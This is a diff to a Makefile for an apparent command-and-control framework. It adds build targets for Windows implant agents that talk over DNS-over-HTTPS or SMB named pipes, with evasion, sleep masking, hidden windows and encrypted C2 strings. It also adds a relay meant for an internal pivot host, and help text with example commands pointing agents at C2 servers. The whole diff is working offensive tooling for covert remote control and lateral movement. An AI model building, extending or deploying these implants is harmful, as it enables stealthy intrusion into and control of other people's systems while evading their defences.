@@ -22,6 +22,14 @@ FRONT_DOMAIN ?=
 # XOR_KEY: single byte as 2-digit hex (00–ff). Default: 5a
 XOR_KEY     ?= 5a
 
+# Alternative transport selection (agent-win-doh / agent-win-smb targets)
+# TRANSPORT: http (default) | doh | icmp | smb
+TRANSPORT   ?= http
+DOH_DOMAIN  ?=              # required for doh transport (e.g. c2.example.com)
+DOH_PROVIDER ?= cloudflare  # cloudflare | google
+SMB_RELAY   ?=              # required for smb transport (hostname or IP of relay)
+SMB_PIPE    ?= svcctl       # named pipe on relay host
+
 # Build flags
 GO          := go
 GARBLE      := garble
@@ -31,13 +39,19 @@ LDFLAGS_BASE := -X main.serverURL=$(C2_SERVER) \
                 -X main.defaultInterval=$(INTERVAL) \
                 -X main.defaultJitter=$(JITTER) \
                 -X main.defaultProfile=$(PROFILE) \
-                -X main.defaultFrontDomain=$(FRONT_DOMAIN)
+                -X main.defaultFrontDomain=$(FRONT_DOMAIN) \
+                -X main.defaultTransport=$(TRANSPORT) \
+                -X main.defaultDOHDomain=$(DOH_DOMAIN) \
+                -X main.defaultDOHProvider=$(DOH_PROVIDER) \
+                -X main.defaultSMBRelay=$(SMB_RELAY) \
+                -X main.defaultSMBPipe=$(SMB_PIPE)
 
 LDFLAGS_STRIP := $(LDFLAGS_BASE) -s -w
 LDFLAGS_WIN   := $(LDFLAGS_STRIP) -H windowsgui
 
 .PHONY: all server operator generate strenc agent-windows agent-linux agent-darwin \
-        agent-win-stealth agent-win-garble agent-win-encrypted stager deps clean help sign
+        agent-win-stealth agent-win-garble agent-win-encrypted agent-win-doh agent-win-smb \
+        stager smb-relay deps clean help sign sign-cert build-check
 
 ## ── Default ──────────────────────────────────────────────────────────────────
 
@@ -140,6 +154,53 @@ agent-win-encrypted: strenc ## Build Windows stealth agent with XOR-encrypted bu
 	@echo "[+] Encrypted agent: $(BINARY_DIR)/agent_windows_enc.exe"
 	@echo "    C2 URL (encrypted): $(ENC_SERVER)  [key=$(XOR_KEY)]"
 	@echo "    No plaintext strings in binary for C2 URL / AES keys"
+
+agent-win-doh: ## Build Windows agent using DNS-over-HTTPS transport (requires DOH_DOMAIN)
+	@test -n "$(DOH_DOMAIN)" || (echo "[-] DOH_DOMAIN is required. Example: make agent-win-doh DOH_DOMAIN=c2.example.com" && exit 1)
+	@mkdir -p $(BINARY_DIR)
+	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	$(GO) build \
+		-ldflags "$(LDFLAGS_WIN) \
+			-X main.defaultTransport=doh \
+			-X main.defaultDOHDomain=$(DOH_DOMAIN) \
+			-X main.defaultDOHProvider=$(DOH_PROVIDER) \
+			-X main.defaultExecMethod=powershell \
+			-X main.defaultEnableEvasion=true \
+			-X main.defaultSleepMasking=true \
+			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
+		-o $(BINARY_DIR)/agent_windows_doh.exe \
+		$(AGENT_DIR)
+	@echo "[+] DoH agent: $(BINARY_DIR)/agent_windows_doh.exe"
+	@echo "    Domain  : $(DOH_DOMAIN)"
+	@echo "    Provider: $(DOH_PROVIDER)"
+
+agent-win-smb: ## Build Windows agent using SMB named pipe transport (requires SMB_RELAY)
+	@test -n "$(SMB_RELAY)" || (echo "[-] SMB_RELAY is required. Example: make agent-win-smb SMB_RELAY=FILESERVER01" && exit 1)
+	@mkdir -p $(BINARY_DIR)
+	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	$(GO) build \
+		-ldflags "$(LDFLAGS_WIN) \
+			-X main.defaultTransport=smb \
+			-X main.defaultSMBRelay=$(SMB_RELAY) \
+			-X main.defaultSMBPipe=$(SMB_PIPE) \
+			-X main.defaultExecMethod=powershell \
+			-X main.defaultEnableEvasion=true \
+			-X main.defaultSleepMasking=true \
+			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
+		-o $(BINARY_DIR)/agent_windows_smb.exe \
+		$(AGENT_DIR)
+	@echo "[+] SMB agent: $(BINARY_DIR)/agent_windows_smb.exe"
+	@echo "    Relay: \\\\$(SMB_RELAY)\\pipe\\$(SMB_PIPE)"
+
+smb-relay: ## Build SMB named pipe relay (deploy on internal pivot host)
+	@mkdir -p $(BINARY_DIR)
+	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	$(GO) build \
+		-ldflags "-s -w" \
+		-o $(BINARY_DIR)/smb_relay.exe \
+		./cmd/listener/smb_relay.go
+	@echo "[+] SMB relay: $(BINARY_DIR)/smb_relay.exe"
+	@echo "    Usage: smb_relay.exe --pipe $(SMB_PIPE) --c2 $(C2_SERVER) --key $(ENC_KEY)"
 
 agent-linux: ## Build Linux agent
 	@mkdir -p $(BINARY_DIR)
@@ -254,9 +315,16 @@ help: ## Show this help
 	@echo "  \033[33mWORK_START\033[0m  Working hours start  (0-23)"
 	@echo "  \033[33mWORK_END\033[0m    Working hours end    (0-23)"
 	@echo "  \033[33mXOR_KEY\033[0m     XOR byte (2-digit hex, default: 5a) for agent-win-encrypted"
+	@echo "  \033[33mDOH_DOMAIN\033[0m  C2 DNS zone (required for agent-win-doh)"
+	@echo "  \033[33mDOH_PROVIDER\033[0m cloudflare|google (default: cloudflare)"
+	@echo "  \033[33mSMB_RELAY\033[0m   Relay host name/IP (required for agent-win-smb)"
+	@echo "  \033[33mSMB_PIPE\033[0m    Named pipe name on relay (default: svcctl)"
 	@echo ""
 	@echo "  Examples:"
 	@echo "  \033[2mmake agent-win-stealth C2_SERVER=http://192.168.1.10:8080 ENC_KEY=MyKey1234567890 KILL_DATE=2026-12-31\033[0m"
 	@echo "  \033[2mmake agent-custom C2_SERVER=https://c2.domain.com INTERVAL=300 JITTER=40 WORK_START=8 WORK_END=18\033[0m"
 	@echo "  \033[2mmake agent-win-encrypted C2_SERVER=https://c2.domain.com ENC_KEY=MyKey1234567890 XOR_KEY=a3\033[0m"
+	@echo "  \033[2mmake agent-win-doh DOH_DOMAIN=c2.example.com ENC_KEY=MyKey1234567890\033[0m"
+	@echo "  \033[2mmake agent-win-smb SMB_RELAY=FILESERVER01 SMB_PIPE=svcctl C2_SERVER=https://c2.domain.com\033[0m"
+	@echo "  \033[2mmake smb-relay C2_SERVER=https://c2.domain.com ENC_KEY=MyKey1234567890\033[0m"
 	@echo ""
